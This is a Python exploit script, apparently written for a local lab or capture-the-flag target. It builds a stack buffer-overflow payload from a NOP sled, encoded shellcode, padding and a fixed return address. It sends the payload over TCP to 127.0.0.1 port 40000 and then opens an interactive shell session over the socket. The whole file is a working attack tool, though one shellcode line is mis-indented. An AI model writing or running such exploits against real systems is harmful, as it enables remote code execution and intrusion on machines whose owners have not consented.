#!/usr/bin/python3

import socket
import struct

def create_payload():
    # NOP sled
    nop_sled = b"\x90" * 50
    
    # Shellcode - example from the Untitled-1 file
        shellcode = b"" + \
        b"\xdb\xd8\xd9\x74\x24\xf4\xba\x70\x4b\xa8\xa6\x5e" +\
        b"\x29\xc9\xb1\x0b\x83\xc6\x04\x31\x56\x16\x03\x56" +\
        b"\x16\xe2\x85\x21\xa3\xfe\xfc\xe4\xd5\x96\xd3\x6b" +\
        b"\x93\x80\x43\x43\xd0\x26\x93\xf3\x39\xd5\xfa\x6d" +\
        b"\xcf\xfa\xae\x99\xc7\xfc\x4e\x5a\xf7\x9e\x27\x34" +\
        b"\x28\x2c\xdf\xc8\x61\x81\x96\x28\x40\xa5"
    
    # Calculate padding needed - using 108 as buffer size based on Untitled-1
    padding = b"A" * (108 - len(nop_sled) - len(shellcode))
    
    # Return address to overwrite EIP - using the address from Untitled-1
    ret_addr = struct.pack("<I", 0xbffff014)  # Little-endian return address
    
    # Construct final payload
    payload = nop_sled + shellcode + padding + ret_addr
    return payload

def send_exploit(host, port):
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to target
        print(f"[*] Connecting to {host}:{port}")
        s.connect((host, port))
        
        # Send payload
        print("[*] Sending exploit payload...")
        payload = create_payload()
        s.send(payload)
        
        print("[*] Exploit sent successfully!")
        
        # Try to interact with shell
        while True:
            # Send commands
            command = input("shell> ")
            if command.lower() == 'exit':
                break
            s.send(command.encode() + b'\n')
            
            # Get output
            response = s.recv(4096)
            print(response.decode())
            
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    finally:
        s.close()

if __name__ == "__main__":
    target_host = "127.0.0.1"
    target_port = 40000  # Using port 40000 as seen in the terminal output
    
    print("Basic Buffer Overflow Exploit")
    print("----------------------------")
    send_exploit(target_host, target_port)